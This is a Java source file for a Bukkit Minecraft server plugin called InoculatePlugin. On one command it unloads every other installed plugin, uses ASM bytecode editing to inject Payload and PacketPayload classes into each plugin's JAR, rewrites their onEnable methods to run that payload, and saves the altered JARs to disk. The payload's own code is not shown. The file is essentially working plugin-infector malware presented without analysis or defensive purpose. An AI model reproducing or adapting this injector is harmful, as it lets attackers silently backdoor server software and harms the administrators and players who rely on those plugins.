package inoculate;

import inoculate.injector.Payload;
import inoculate.injector.jar.JarInjector;
import inoculate.injector.jar.JarReader;
import inoculate.injector.jar.JarWriter;
import inoculate.payloads.PacketPayload;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.tree.*;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URLClassLoader;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import java.util.Map;

public class InoculatePlugin extends JavaPlugin {

    @Override
    public void onEnable() {
        super.onEnable();
    }

    @Override
    public void onDisable() {
        super.onDisable();
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!command.getName().equalsIgnoreCase("inoculate")) {
            return false;
        }

        final PluginManager manager = Bukkit.getPluginManager();
        final List<Plugin> plugins = Arrays.asList(manager.getPlugins());

        plugins.stream()
                .filter(plugin -> plugin != this)
                .forEach(plugin -> {
                    try {
                        unloadPlugin(plugin, true);
                        inject(plugin);
                    } catch (IOException | URISyntaxException | ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                });

        return true;
    }

    public void inject(Plugin plugin) throws IOException, URISyntaxException, ClassNotFoundException {
        final URI uri = plugin.getClass().getProtectionDomain().getCodeSource().getLocation().toURI();
        final File file = Paths.get(uri).toFile();

        final JarReader reader = new JarReader(file);
        Map<String, byte[]> entries = reader.read();

        final JarInjector injector = new JarInjector(entries);
        injector.injectClass(Payload.class);
        injector.injectClass(PacketPayload.class);

        final String owner = plugin.getClass().getName()
                .replaceAll("\\.", "/")
                .concat(".class");

        System.out.println(owner);

        final InsnList instructions = new InsnList();
        final LabelNode labelNode = new LabelNode();
        instructions.add(labelNode);
        instructions.add(new LineNumberNode(0, labelNode));
        instructions.add(new TypeInsnNode(Opcodes.NEW, "inoculate/payloads/PacketPayload"));
        instructions.add(new InsnNode(Opcodes.DUP));
        instructions.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, "inoculate/payloads/PacketPayload", "<init>", "()V", false));
        instructions.add(new VarInsnNode(Opcodes.ALOAD, 0));
        instructions.add(new MethodInsnNode(Opcodes.INVOKEVIRTUAL, "inoculate/payloads/PacketPayload", "onEnable", "(Lorg/bukkit/plugin/Plugin;)V", false));

        //injector.injectMethodInstructions(owner, "onLoad", "()V", instructions);
        injector.injectMethodInstructions(owner, "onEnable", "()V", instructions);

        final JarWriter writer = new JarWriter(file);
        writer.write(injector.save());
        writer.close();
    }

    public void unloadPlugin(Plugin plugin, boolean garbageCollector) throws IOException {
        Bukkit.getPluginManager().disablePlugin(plugin);

        ClassLoader classLoader = plugin.getClass().getClassLoader();
        if (classLoader instanceof URLClassLoader) {
            ((URLClassLoader)classLoader).close();
        }

        if (garbageCollector) {
            System.gc();
        }
    }

}
